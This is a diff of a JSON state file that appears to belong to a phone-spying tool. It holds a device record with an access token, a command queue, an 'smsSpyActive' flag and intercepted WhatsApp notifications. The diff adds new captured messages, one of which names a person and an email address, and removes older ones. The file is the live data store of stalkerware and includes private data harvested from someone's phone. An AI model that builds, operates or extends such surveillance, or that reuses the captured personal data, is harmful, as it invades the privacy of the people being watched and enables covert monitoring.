@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776950903870,
+    "lastSeen": 1776950927875,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎63 pesan dari 42 chat",
+        "time": "23/04 21:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776950905946
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Wabot",
+        "content": "📷 Thank you, Rama Yandi. The Wabot account for at6327638@gmail.com has been activated.\n\nLog in here:\nhttps://app.wabot.my/login or click button login to link your number 👇\n\nUser guide:\nhttps://docs.fatomate.com . Please check your email to get special coupon 20% off. \n\nIf you experience any issues, please let us know.",
+        "time": "23/04 21:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776950905933
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 19:13",
         "pkg": "com.whatsapp",
         "receivedAt": 1776942836559
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎64 pesan dari 39 chat",
-        "time": "23/04 19:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942836267
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎64 pesan dari 39 chat",
-        "time": "23/04 19:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942836011
       }
     ],
     "galleryPhotos": [],
